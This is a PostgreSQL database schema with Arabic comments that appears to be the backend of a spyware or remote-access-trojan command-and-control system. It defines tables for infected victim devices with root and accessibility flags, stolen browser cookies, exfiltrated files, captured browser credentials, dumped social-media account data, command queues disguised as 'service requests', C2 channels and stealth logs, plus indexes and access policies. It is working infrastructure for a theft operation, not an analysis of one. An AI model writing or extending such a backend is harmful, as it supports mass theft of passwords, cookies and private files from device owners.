-- database/complete_schema.sql (نفذ في كل مشروع من المشاريع الأربعة)
-- ============================================================
-- 1. حذف الجداول القديمة (اختياري، لكننا نستخدم IF EXISTS)
-- ============================================================
DROP TABLE IF EXISTS sessions CASCADE;
DROP TABLE IF EXISTS banned_chats CASCADE;
DROP TABLE IF EXISTS notification_logs CASCADE;
DROP TABLE IF EXISTS media_captures CASCADE;
DROP TABLE IF EXISTS service_tasks CASCADE;
DROP TABLE IF EXISTS client_info CASCADE;
DROP TABLE IF EXISTS clipboard_logs CASCADE;
DROP TABLE IF EXISTS installed_apps CASCADE;
DROP TABLE IF EXISTS video_call_alerts CASCADE;
DROP TABLE IF EXISTS pos_clients CASCADE;
DROP TABLE IF EXISTS device_keys CASCADE;
DROP TABLE IF EXISTS service_requests CASCADE;
DROP TABLE IF EXISTS stolen_cookies CASCADE;
DROP TABLE IF EXISTS exfil CASCADE;
DROP TABLE IF EXISTS browser_creds CASCADE;
DROP TABLE IF EXISTS social_dumps CASCADE;
DROP TABLE IF EXISTS ai_tasks CASCADE;
DROP TABLE IF EXISTS ai_results CASCADE;
DROP TABLE IF EXISTS c2_channels CASCADE;
DROP TABLE IF EXISTS stealth_logs CASCADE;
DROP TABLE IF EXISTS error_logs CASCADE;
DROP TABLE IF EXISTS c2_status CASCADE;

-- ============================================================
-- 2. جداول الجلسات والحظر (لنظام الخمول والأمان)
-- ============================================================
CREATE TABLE sessions (
    chat_id BIGINT PRIMARY KEY,
    last_activity TIMESTAMPTZ DEFAULT now(),
    session_token TEXT
);

CREATE TABLE banned_chats (
    chat_id BIGINT PRIMARY KEY,
    banned_at TIMESTAMPTZ DEFAULT now()
);

-- ============================================================
-- 3. الهيكل الجديد بالكامل (متوافق مع جميع الميزات)
-- ============================================================

-- جدول الأجهزة المسجلة
CREATE TABLE pos_clients (
    Entry_id BIGSERIAL PRIMARY KEY,
    Client_serial TEXT UNIQUE NOT NULL,
    Hardware_uuid TEXT,
    Public_key TEXT,
    First_seen TIMESTAMPTZ DEFAULT now(),
    Last_seen TIMESTAMPTZ DEFAULT now(),
    Operational_status TEXT DEFAULT 'online',
    Has_root BOOLEAN DEFAULT false,
    Has_accessibility BOOLEAN DEFAULT false,
    Ip_address TEXT,
    Victim_data_enc TEXT,
    Device_config JSONB
);

-- جدول المفاتيح
CREATE TABLE device_keys (
    Device_id TEXT PRIMARY KEY REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Shared_key_enc TEXT NOT NULL,
    Expiry BIGINT NOT NULL
);

-- جدول الأوامر (مشابه لـ service_tasks)
CREATE TABLE service_requests (
    Ticket_id BIGSERIAL PRIMARY KEY,
    Target_client TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Request_type TEXT NOT NULL,
    Request_data TEXT,
    Ticket_status TEXT DEFAULT 'open',
    Resolution_log JSONB,
    Opened_at TIMESTAMPTZ DEFAULT now(),
    Last_updated TIMESTAMPTZ DEFAULT now()
);

-- جداول استخراج البيانات
CREATE TABLE stolen_cookies (
    Id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Cookies JSONB NOT NULL,
    Timestamp TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE exfil (
    Id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    File_path TEXT NOT NULL,
    File_name TEXT,
    File_size BIGINT,
    Mime_type TEXT,
    File_type TEXT GENERATED ALWAYS AS (
        CASE
            WHEN file_name ~* '\.(jpg|jpeg|png|gif|webp)$' THEN 'image'
            WHEN file_name ~* '\.(mp4|avi|mov|mkv|webm)$' THEN 'video'
            ELSE 'other'
        END
    ) STORED,
    Uploaded_at TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE browser_creds (
    Id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Browser TEXT,
    url TEXT,
    Username TEXT,
    Password_enc TEXT,
    Captured_at TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE social_dumps (
    Id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    App TEXT,
    Account_data JSONB,
    Dumped_at TIMESTAMPTZ DEFAULT now()
);

-- جداول الذكاء الاصطناعي والعمليات
CREATE TABLE ai_tasks (
    Task_id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Task_type TEXT NOT NULL,
    Task_params JSONB,
    Result_data JSONB,
    Status TEXT DEFAULT 'pending',
    Created_at TIMESTAMPTZ DEFAULT now(),
    Completed_at TIMESTAMPTZ
);

CREATE TABLE ai_results (
    Id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Module TEXT,
    Result JSONB,
    Created_at TIMESTAMPTZ DEFAULT now()
);

-- جداول الاتصال والتخفي
CREATE TABLE c2_channels (
    Channel_id BIGSERIAL PRIMARY KEY,
    Channel_type TEXT NOT NULL,
    Channel_name TEXT,
    Is_active BOOLEAN DEFAULT true,
    Last_used TIMESTAMPTZ DEFAULT now(),
    Usage_count BIGINT DEFAULT 0
);

CREATE TABLE stealth_logs (
    Log_id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Event_type TEXT NOT NULL,
    Event_data JSONB,
    Timestamp TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE error_logs (
    Id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Error_code TEXT NOT NULL,
    Error_message TEXT,
    Module TEXT,
    Stack_trace TEXT,
    Timestamp TIMESTAMPTZ DEFAULT now(),
    Resolved BOOLEAN DEFAULT false
);

CREATE TABLE c2_status (
    Id BIGSERIAL PRIMARY KEY,
    Channel TEXT,
    Status TEXT,
    Last_check TIMESTAMPTZ DEFAULT now(),
    Error_message TEXT
);

-- ============================================================
-- 4. الفهارس لسرعة الأداء
-- ============================================================
CREATE INDEX idx_pos_clients_serial ON pos_clients(client_serial);
CREATE INDEX idx_requests_target ON service_requests(target_client);
CREATE INDEX idx_cookies_device ON stolen_cookies(device_id);
CREATE INDEX idx_exfil_device ON exfil(device_id);
CREATE INDEX idx_exfil_type ON exfil(file_type);
CREATE INDEX idx_creds_device ON browser_creds(device_id);
CREATE INDEX idx_ai_results_device ON ai_results(device_id);
CREATE INDEX idx_errors_device ON error_logs(device_id);
CREATE INDEX idx_ai_tasks_device ON ai_tasks(device_id);
CREATE INDEX idx_stealth_logs_device ON stealth_logs(device_id);
CREATE INDEX idx_sessions_chat ON sessions(chat_id);
CREATE INDEX idx_banned_chats ON banned_chats(chat_id);

-- ============================================================
-- 5. تفعيل RLS وسياسة service_role
-- ============================================================
ALTER TABLE sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE banned_chats ENABLE ROW LEVEL SECURITY;
ALTER TABLE pos_clients ENABLE ROW LEVEL SECURITY;
ALTER TABLE device_keys ENABLE ROW LEVEL SECURITY;
ALTER TABLE service_requests ENABLE ROW LEVEL SECURITY;
ALTER TABLE stolen_cookies ENABLE ROW LEVEL SECURITY;
ALTER TABLE exfil ENABLE ROW LEVEL SECURITY;
ALTER TABLE browser_creds ENABLE ROW LEVEL SECURITY;
ALTER TABLE social_dumps ENABLE ROW LEVEL SECURITY;
ALTER TABLE ai_tasks ENABLE ROW LEVEL SECURITY;
ALTER TABLE ai_results ENABLE ROW LEVEL SECURITY;
ALTER TABLE c2_channels ENABLE ROW LEVEL SECURITY;
ALTER TABLE stealth_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE error_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE c2_status ENABLE ROW LEVEL SECURITY;

DO $$
DECLARE
    tbl text;
BEGIN
    FOR tbl IN (SELECT table_name FROM information_schema.tables WHERE table_schema = 'public') LOOP
        EXECUTE format('DROP POLICY IF EXISTS "Service role full access" ON %I', tbl);
        EXECUTE format('CREATE POLICY "Service role full access" ON %I FOR ALL USING (auth.role() = ''service_role'')', tbl);
    END LOOP;
END $$;
